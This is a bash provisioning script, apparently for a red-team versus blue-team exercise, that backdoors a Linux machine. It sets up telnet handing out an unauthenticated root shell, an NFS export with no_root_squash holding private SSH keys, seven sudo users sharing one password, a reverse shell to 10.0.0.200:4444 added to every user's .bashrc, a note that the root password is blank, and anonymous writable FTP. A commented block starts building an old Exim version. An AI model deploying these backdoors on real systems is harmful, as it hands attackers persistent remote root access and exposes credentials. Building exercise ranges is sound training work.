#!/bin/bash

# telnet to root shell
sudo apt update
sudo apt-get install telnetd -y
touch /usr/local/bin/telnet
echo "#!/bin/bash" > /usr/local/bin/telnet
echo "exec /bin/bash -i" >> /usr/local/bin/telnet
chmod +x /usr/local/bin/telnet
sudo systemctl restart inetutils-inetd
sudo iptables -A INPUT -p tcp --dport 23 -j ACCEPT
echo "telnet stream tcp nowait root /usr/sbin/telnetd telnetd -E  /usr/local/bin/telnet" >> /etc/inetd.conf

#nfs with ssh keys and creds
sudo apt install nfs-kernel-server -y
mkdir -p /srv/nfs
echo "/srv/nfs *(rw,sync,no_root_squash,no_subtree_check)" | sudo tee -a /etc/exports
sudo systemctl restart nfs-kernel-server

USERS=("aiden" "redhead" "megamind" "izzabizzradio" "maggiegz" "owendraingang" "dhrupad")
PASSWORD="Blueteamsux123!"

for USER in "${USERS[@]}"; do
  sudo useradd -m "$USER"
  sudo usermod -aG sudo "$USER"
  echo "$USER:$PASSWORD" | sudo chpasswd
done

for USER in "${USERS[@]}"; do
  sudo mkdir -p /home/$USER/.ssh
done

sudo mkdir -p /srv/nfs/.ssh

for USER in "${USERS[@]}"; do
  sudo ssh-keygen -t rsa -f /srv/nfs/.ssh/${USER}_id_rsa -N ""
  sudo cp /srv/nfs/.ssh/${USER}_id_rsa.pub /home/$USER/.ssh/authorized_keys
  sudo chown $USER:$USER /home/$USER/.ssh/authorized_keys
  sudo chmod 600 /home/$USER/.ssh/authorized_keys
  
  # rev shell in .bashrc
  echo -e "bash -c 'bash -i >& /dev/tcp/10.0.0.200/4444 0>&1' & disown" | sudo tee -a /home/$USER/.bashrc
done

# root password in share
touch /srv/nfs/reminder
echo "in case you forget root password is blank" > /srv/nfs/reminder

# ftp maybe
sudo apt install vsftpd -y
sudo cp /etc/vsftpd.conf /etc/vsftpd.conf.bak
sudo tee /etc/vsftpd.conf > /dev/null << EOT
listen=YES
anonymous_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_other_write_enable=YES
anon_root=/var/ftp
local_enable=YES
write_enable=YES
local_umask=022
dirmessage_enable=YES
use_localtime=YES
xferlog_enable=YES
connect_from_port_20=YES
secure_chroot_dir=/var/run/vsftpd/empty
pam_service_name=vsftpd
EOT

# Create FTP directories
sudo mkdir -p /var/ftp/pub
sudo chmod 777 -R /var/ftp/pub
sudo systemctl restart vsftpd
sudo systemctl enable vsftpd



# MAIL SERVER TO DO BUT THIS FUCKING SUCKS I SPENT THREE FUCKING HOURS ON THIS STUPID SHIT

#wget https://ftp.exim.org/pub/exim/exim4/old/exim-4.96.tar.gz
#tar -xvf exim-4.96.tar.gz
#cd exim-4.96/
#touch Local/Makefile
#sudo groupadd exim
#sudo useradd -g exim -s /sbin/nologin -d /var/spool/exim exim
#echo -e "BIN_DIRECTORY=/usr/exim/bin\nCONFIGURE_FILE=/usr/exim/configure\nEXIM_USER=exim\nSPOOL_DIRECTORY=/var/spool/exim\nUSE_OPENSSL=yes\nTLS_LIBS=-lssl -lcrypto\nROUTER_ACCEPT=yes\nROUTER_DNSLOOKUP=yes\nROUTER_IPLITERAL=yes\nROUTER_MANUALROUTE=yes\nROUTER_QUERYPROGRAM=yes\nROUTER_REDIRECT=yes\nTRANSPORT_APPENDFILE=yes\nTRANSPORT_AUTOREPLY=yes\nTRANSPORT_PIPE=yes\nTRANSPORT_SMTP=yes\nLOOKUP_DBM=yes\nLOOKUP_LSEARCH=yes\nLOOKUP_DNSDB=yes\nPCRE2_CONFIG=yes\nSUPPORT_DANE=yes\nDISABLE_MAL_AVE=yes\nDISABLE_MAL_KAV=yes\nDISABLE_MAL_MKS=yes\nFIXED_NEVER_USERS=root\nHEADERS_CHARSET=\"ISO-8859-1\"\nSYSLOG_LOG_PID=yes\nEXICYCLOG_MAX=10\nCOMPRESS_COMMAND=/usr/bin/gzip\nCOMPRESS_SUFFIX=gz\nZCAT_COMMAND=/usr/bin/zcat\nSYSTEM_ALIASES_FILE=/etc/aliases\nEXIM_TMPDIR=\"/tmp\"" >> Local/Makefile
#sudo apt install libpcre2-dev -y 
#sudo apt install build-essential -y 
#sudo apt install libdb-dev -y 
#sudo apt install libssl-dev -y
#sudo apt-get install libnsl-dev -y
#sudo apt-get install libpcre3-dev -y
#make
#sudo make install
